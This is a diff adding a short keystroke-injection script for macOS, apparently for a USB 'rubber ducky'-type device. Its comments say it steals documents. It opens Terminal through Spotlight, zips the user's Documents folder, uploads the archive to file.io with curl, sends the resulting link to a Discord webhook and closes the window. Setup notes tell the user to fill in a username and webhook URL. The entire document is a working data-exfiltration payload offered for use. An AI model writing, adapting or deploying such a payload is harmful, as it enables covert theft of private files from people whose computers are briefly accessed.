@@ -1,0 +1,35 @@
+REM made by zoom1781
+REM only for MacOS
+REM repace yourusername with your name and repace your dis cord webhook with a discord webhook
+REM this will tak doucments and send them to a discord webhook
+
+DELAY 2000
+COMMAND SPACE          # Open Spotlight
+DELAY 500
+STRING terminal        # Search for Terminal
+DELAY 1000
+ENTER                  # Open Terminal
+DELAY 2000             # Wait for terminal to open
+
+# Create a zip file of the Documents directory
+STRING zip -r /Users/yourusername/Documents_copied.zip /Users/yourusername/Documents
+ENTER
+DELAY 3000             # Wait for zip operation to complete
+
+# Upload the zip file to file.io
+STRING curl -F "file=@/Users/yourusername/Documents_copied.zip" https://file.io -o /Users/yourusername/upload_result.txt
+ENTER
+DELAY 3000             # Wait for the file upload to complete
+
+# Extract the URL from the upload result
+STRING UPLOAD_URL=$(grep -o 'https://file.io/[^"]*' /Users/yourusername/upload_result.txt)
+ENTER
+DELAY 1000
+
+# Send the file URL to the Discord webhook
+STRING curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"Here is the file: $UPLOAD_URL\"}" YOUR_DISCORD_WEBHOOK_URL
+ENTER
+DELAY 1000             # Sends the message to Discord
+
+# Close the terminal
+COMMAND W              # Close terminal window
